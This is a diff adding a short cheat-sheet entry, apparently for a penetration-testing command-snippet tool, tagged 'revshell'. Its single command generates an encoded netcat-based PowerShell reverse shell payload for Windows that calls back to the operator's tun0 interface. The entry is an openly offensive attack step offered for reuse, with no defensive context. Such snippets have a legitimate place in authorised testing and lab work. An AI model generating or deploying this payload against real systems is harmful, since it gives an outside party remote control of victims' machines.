@@ -1,0 +1,7 @@
+---
+syntax: bash
+tags: [revshell]
+---
+# generate ain encoded netcat based, powershell windows reverse shell
+generate payload=windows/netcat/powershell_reverse_tcp lhost=tun0 encode
+
